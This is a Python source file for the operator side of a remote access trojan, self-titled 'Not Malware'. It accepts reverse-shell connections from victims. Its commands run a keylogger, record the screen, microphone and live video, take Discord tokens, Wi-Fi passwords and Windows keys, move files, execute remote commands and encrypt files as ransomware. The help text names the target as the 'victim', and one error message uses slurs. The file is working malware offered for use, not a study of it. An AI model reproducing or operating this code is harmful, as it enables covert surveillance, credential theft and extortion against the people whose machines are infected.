import argparse, socket, httpx, os, socket, time, asyncio
from threading import Thread
from vidstream import StreamingServer


parser = argparse.ArgumentParser(description="NOT, python reverse shell using sockets.")
parser.add_argument( "-p", "--port", default=421, help="Port of the Server", type=int)
parser.add_argument("-d", "--discord", help="Discord webhook for new connections", type=str)    

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'

''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'



class Functions(object):
    @staticmethod
    def exit_tm(self):
        exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n{END}")
            time.sleep(0.4)
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
        if exit_choice == "y":
            commands = "exit"
            self.client_socket.send(commands.encode())
            self.client_socket.close()
            self.s.close()
            print(f"\n[{EXIT}] {END}\n")
            os._exit(0)
        if exit_choice == "n":
            pass
    @staticmethod
    def record_screen(self):
        filename = input(f"[{IMPORTANT}] filename of recording: {END}")
        filename = filename + ".mp4"
        self.client_socket.send(self.command.encode())
        time_stop = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
        self.client_socket.send(time_stop.encode())
        print(f"[{IMPORTANT}] recording ......{END}\n")
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./recordings/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print(f"[{INFO}] recording recved successfully{END}")
    @staticmethod
    def screenshot(self):
        filename = input(f"[{IMPORTANT}] filename of screenshot: {END}")
        filename = filename + ".png"
        print(f"[{IMPORTANT}] taking screenshot ......{END}\n")
        self.client_socket.send(self.command.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./screenshots/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print(f"[{INFO}] screenshot recved successfully{END}")
    @staticmethod
    def start_keylogger(self):
        global runningz
        runningz = True
        def keylogger_loop():
            global runningz
            print(f"[{IMPORTANT}] logging keys .....{END}")
            LOGGER_HOST = "0.0.0.0"
            LOGGER_PORT = 422
            l = socket.socket()
            l.bind((LOGGER_HOST, LOGGER_PORT))
            l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            l.listen(5)
            self.client_socket.send(self.command.encode())
            logger_socket, logger_address = l.accept()
            def keylogger():
                while runningz:
                    msg = logger_socket.recv(self.BUFFER_SIZE).decode()
                    addr = logger_socket.getpeername()[0]
                    with open(f"./logs/{addr}-log.txt", "a+") as file1:
                        file1.write(f"{msg}")
            loggerz = Thread(target=keylogger)
            loggerz.daemon = True
            loggerz.start()
        keylogger_loopz = Thread(target=keylogger_loop)
        keylogger_loopz.daemon = True
        keylogger_loopz.start()
    @staticmethod
    def stop_keylogger(self):
        self.client_socket.send(self.command.encode())
        print(f"[{IMPORTANT}] logging stopped{END}")
        runningz = False
    @staticmethod
    def send_command(self):
        self.client_socket.send(self.command.encode())
        cwd = self.client_socket.recv(self.BUFFER_SIZE).decode()
        send_command = input(f"\n[{REMOTE}] {cwd} $> {END}")
        if not send_command.strip():
            pass
        self.client_socket.send(send_command.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode()
        results, cwd = output.split(self.SEPARATOR)
        print(results)
    @staticmethod
    def send_commands(self):
        self.client_socket.send(self.command.encode())
        running = True
        cwd = self.client_socket.recv(self.BUFFER_SIZE).decode()
        while running:
            send_command = input(f"\n[{REMOTE}] {cwd} $> {END}")
            if not send_command.strip():
                continue
            if send_command == "exit":
                self.client_socket.send(send_command.encode())
                break
            self.client_socket.send(send_command.encode())
            output = self.client_socket.recv(self.BUFFER_SIZE).decode()
            results, cwd = output.split(self.SEPARATOR)
            print(results)
    @staticmethod
    def encrypt_files(self):
        self.client_socket.send(self.command.encode())
        print(f"[{IMPORTANT}] encrypting files ......{END}")
        print(self.client_socket.recv(self.BUFFER_SIZE).decode())
    @staticmethod
    def decrypt_files(self):
        self.client_socket.send(self.command.encode())
        print(f"[{IMPORTANT}] decrpyting files ......{END}")
        print(self.client_socket.recv(self.BUFFER_SIZE).decode())
    @staticmethod
    def record_mic(self):
        filename = input(f"[{IMPORTANT}] filename of mic audio: {END}")
        filename = filename + ".wav"
        self.client_socket.send(self.command.encode())
        self.client_socket.send(self.command.encode())
        record_time = input(f"[{IMPORTANT}] how long do you want to record for: {END}")
        self.client_socket.send(record_time.encode())
        print(f"[{IMPORTANT}] recording mic ......{END}\n")
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./microphone/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
        print(f"[{INFO}] audio recved successfully{END}")
    @staticmethod
    def get_wifi(self):
        print(f"[{IMPORTANT}] getting wifi profiles{END}\n")
        self.client_socket.send("get wifi".encode())
        print(self.client_socket.recv(self.BUFFER_SIZE).decode())
    @staticmethod
    def clear_tm():
        def clear():
            os.system('cls' if os.name=='nt' else 'clear')
            return("   ")
        clear()
        print(f"[{CLEAR}] ")
    @staticmethod
    def get_file(self):
        self.client_socket.send(self.command.encode())
        filename = input(f"[{IMPORTANT}] Please enter the filename: ")
        self.client_socket.send(filename.encode())
        remaining = int.from_bytes(self.client_socket.recv(4),'big')
        f = open(f"./files/{filename}","wb")
        while remaining:
            data = self.client_socket.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    @staticmethod
    def send_file(self):
        self.client_socket.send(self.command.encode())
        filename = input(f"[{IMPORTANT}] please enter the filename: ")
        self.client_socket.send(filename.encode())
        try:
            with open(f"./files/{filename}", "rb") as f:
                data = f.read()
                dataLen = len(data)
                self.client_socket.send(dataLen.to_bytes(4,'big'))
                self.client_socket.send(data)
            f.close()
        except FileNotFoundError:
            print(f"\n[{FAILED}] File not found{END}")
    @staticmethod
    def start_live(self):
        self.client_socket.send('get live'.encode())
        p = Thread(target=self.receiver.start_server)
        p.start()
    @staticmethod
    def stop_live(self):
        self.client_socket.send('stop live'.encode())
        self.receiver.stop_server()
    @staticmethod
    def sysinfo(self):
        self.client_socket.send('get sysinfo'.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode().split(self.SEPARATOR)
        HWID, wkey, winver = output
        print(f"[{INFO}] HWID: {HWID}")
        print(f"[{INFO}] Windows Key: {wkey}")
        print(f"[{INFO}] Windows Version: {winver}")
    @staticmethod
    def get_token(self):
        self.client_socket.send('get token'.encode())
        token = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print(f"[{INFO}] Token: {token}")
    @staticmethod
    def netinfo(self):
        self.client_socket.send('get netinfo'.encode())
        output = self.client_socket.recv(self.BUFFER_SIZE).decode().split(self.SEPARATOR)
        ip, city, country, region, org, loc, googlemap = output
        print(f"[{INFO}] IP: {ip}")
        print(f"[{INFO}] City: {city}")
        print(f"[{INFO}] Country: {country}")
        print(f"[{INFO}] Region: {region}")
        print(f"[{INFO}] Org: {org}")
        print(f"[{INFO}] Location: {loc}")
        print(f"[{INFO}] Google Map: {googlemap}")
    def help():
        print(
        f'''{MAIN}
        \r  Command                    Description
        \r  -------                    -----------
        \r  help                       Print this message.
        \r  get wifi                   Gets SSIDs and security keys.
        \r  get token                  Gets discord token.
        \r  get sysinfo                Gets system information.
        \r  get netinfo                Gets network information.
        \r  get live                   Live Recording of victim's screen.
        \r  stop live                  Stops Live Recording of victim's screen.
        \r  record mic                 Records mic for a certain amount of time.
        \r  take screenshot            Takes a screenshot.
        \r  start keylogger            Starts keylogger.
        \r  stop keylogger             Stops keylogger.
        \r  send command               Sends a single command.
        \r  send commands              Sends multiple commands.
        \r  encrypt files              Deploys ransomware.
        \r  decrypt files              Removes ransomware.
        \r  send file                  Sends a file from the files directory in the attacker directory.
        \r  get file                   Gets a file from the victim's CWD and puts it into the files directory.
        \r  clear                      Clear screen.
        \r  exit/quit/q                Close session and exit.
        {END}''')
    
            
    
class Main(Functions):
    def __init__(self):
        print(f"""{PLOAD}
                       __                                    __                                             
                      /  |                                  /  |                                            
 _______    ______   _$$ |_          _____  ____    ______  $$ | __   __   __   ______    ______    ______  
/       \  /      \ / $$   |        /     \/    \  /      \ $$ |/  | /  | /  | /      \  /      \  /      \ 
$$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$ $$$$  | $$$$$$  |$$ |$$ | $$ | $$ | $$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |  $$ |$$ |  $$ |  $$ | __       $$ | $$ | $$ | /    $$ |$$ |$$ | $$ | $$ | /    $$ |$$ |  $$/ $$    $$ |
$$ |  $$ |$$ \__$$ |  $$ |/  |      $$ | $$ | $$ |/$$$$$$$ |$$ |$$ \_$$ \_$$ |/$$$$$$$ |$$ |      $$$$$$$$/ 
$$ |  $$ |$$    $$/   $$  $$/       $$ | $$ | $$ |$$    $$ |$$ |$$   $$   $$/ $$    $$ |$$ |      $$       |
$$/   $$/  $$$$$$/     $$$$/        $$/  $$/  $$/  $$$$$$$/ $$/  $$$$$/$$$$/   $$$$$$$/ $$/        $$$$$$$/ 
                                                                    {END}Not Malware v0.2.1 | fluffydolphin                 
""")
        self.hostname = socket.gethostname()
        self.IPAddr = socket.gethostbyname(self.hostname)
        self.args = parser.parse_args()
        self.SERVER_HOST = "0.0.0.0"
        self.SERVER_PORT = self.args.port
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "<sep>"
        self.receiver = StreamingServer(self.IPAddr, 423)
        self.key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
        self.command_list = ["get token", "get netinfo", "get sysinfo", "get live","stop live","get file", "send file", "send commands", "help", "get wifi", "clear", "scan ports", "exit", "scan local ports", "record screen", "take screenshot", "start keylogger", "send command", "stop keylogger", "encrypt files", "decrypt files", "record mic"]
        
        self.s = socket.socket()
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.listen(5)
        print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {self.SERVER_HOST}:{self.SERVER_PORT} .....{END}")


        self.client_socket, self.client_address = self.s.accept()
        print(f"[{IMPORTANT}] {BOLD}{self.client_address[0]}:{self.client_address[1]} Connected! \n{END}")
        time.sleep(1)
        print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n') #yes I stole this from hoax get over it
        time.sleep(1.8)
        
        while True:
            try:
                self.command = input(f"\n[{INPUT}] $> ")
                if self.command == "exit" or self.command == "quit" or self.command == "q":
                    Functions.exit_tm(self)
                if self.command.lower() == "get token":
                    Functions.get_token(self)
                if self.command.lower() == "get sysinfo":
                    Functions.sysinfo(self)
                if self.command.lower() == "get netinfo":
                    Functions.netinfo(self)
                if self.command.lower() == "record screen":
                    Functions.record_screen(self)
                if self.command.lower() == "take screenshot":
                    Functions.screenshot(self)
                if self.command.lower() == "start keylogger":
                    Functions.start_keylogger(self)
                if self.command.lower() == "stop keylogger":
                    Functions.stop_keylogger(self)
                if self.command.lower() == "send command":
                    Functions.send_command(self)
                if self.command.lower() == "send commands":
                    Functions.send_commands(self)
                if self.command.lower() == "encrypt files":
                    Functions.encrypt_files(self)
                if self.command.lower() == "decrypt files":
                    Functions.decrypt_files(self)
                if self.command.lower() == "record mic":
                    Functions.record_mic(self)
                if self.command.lower() == "get wifi":
                    Functions.get_wifi(self)
                if self.command.lower() == "clear":
                    Functions.clear_tm()
                if self.command.lower() == "get file":
                    Functions.get_file(self)
                if self.command.lower() == "send file":
                    Functions.send_file(self)
                if self.command.lower() == "get live":
                    Functions.start_live(self)
                if self.command.lower() == "stop live":
                    Functions.stop_live(self)
                if self.command.lower() == "help":
                    Functions.help()
                if self.command.lower() not in self.command_list:
                    print(f"[{FAILED}] that aint a command cunt try again retard!! {END}\n")
            except KeyboardInterrupt:
                exit(self.client_socket, self.s)


if __name__ == "__main__" and os.name == "nt":
    try:
        httpx.get('https://google.com')
    except (httpx.NetworkError, httpx.TimeoutException):
        os._exit(0)
    asyncio.run(Main().init())